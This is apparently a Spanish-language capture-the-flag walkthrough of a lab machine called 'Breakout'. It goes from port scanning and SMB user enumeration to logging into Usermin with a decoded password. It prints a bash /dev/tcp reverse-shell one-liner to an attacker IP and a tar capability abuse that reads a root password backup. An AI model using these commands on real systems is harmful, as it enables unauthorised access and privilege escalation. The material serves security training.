PORT      STATE SERVICE
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
10000/tcp open  snet-sensor-mgmt
20000/tcp open  dnp

-Entrando al puerto 80 hay un servidor Apache Default

-En el código fuente descubrimos un texto muy extraño. Nos vamos a Cipher Identifier y descubrimos que está cifrado en lenguaje 'Brainfuck', después los desciframos y obtenemos una posible contraseña:
	Posible contraseña: .2uqPEfj3D<P'a-3

-Haciendo un escaneo más exaustivo con nmap descrubrimos que detrás de los puertos 10000 y 20000 corren dos versiones de 'Miniserv'. Buscamos CVE pero no hay ninguno para usuarios no autenticados. 

-Viendo que tenemos una posible contraseña y no tenemos usuarios. Vamos a desplegar una herramienta llamada 'enum4linux' que saca información relevante del sistema víctima utilizando varias técnicas para enumerar el servicio SMB.
	enum4linux -a 192.168.1.137
	-a: Realiza una serie de enumeraciones de manera automática. Entre ellas está la de enumerar usuarios del sistema.
	-Nos encuentra el usuario 'cyber'


-Vamos a la dirección --> https://192.168.1.137:20000 e introducimos las credenciales obtenidas:
	-User: cyber
	-Password: .2uqPEfj3D<P'a-3

-Estamos dentro del dashboard de Usermin. En el apartado de 'Mail', abajo del todo tenemos un 'command shell' dónde tenemos una consola para ejecutar comandos en el servidor. Nos mandamos una reverse shell
	bash -c 'bash -i >& /dev/tcp/192.198.1.135/1234 0>&1'
	cyber@breakout:~$


## Escalada de Privilegios

-No podemos ejecutar ningún comando a nivel de sudo ni podemos abusar de ningún binario con permisos SUID.

-Buscamos capabilities:
	getcap -r / 2>/dev/null
	/home/cyber/tar cap_dac_read_search=ep

-Significa que a través del binario tar podemos leer cualquier archivo del sistema como si fueramos root.

-Investigando por la máquina encontramos el archivo '/var/backups/.old_pass.bak' dónde probablemente se encuentre la contraseña del usuario root.

-Utilizamos el binario 'tar' que gracias a la capability 'cap_dac_read_search=ep' puede leer cualquier archivo. Hay que generar un archivo .tar (lo llamamos clave.tar) del archivo leido y luego descomprimirlo con tar para ver el contenido en texto claro:
	cyber@breakout:/home/cyber --> ./tar -cf clave.tar /var/backups/.old_pass.bak
	-Descomprimimos 'clave.tar': tar -xvf clave.tar
	-Ahora tenemos permisos para leer el archivo: cat /var/backups/.old_pass.bak
		Ts&4&YurgtRX(=~h
	-Nos autenticamos como root con la contraseña obtenida:
		su root
		password: Ts&4&YurgtRX(=~h

root@breakout:~#


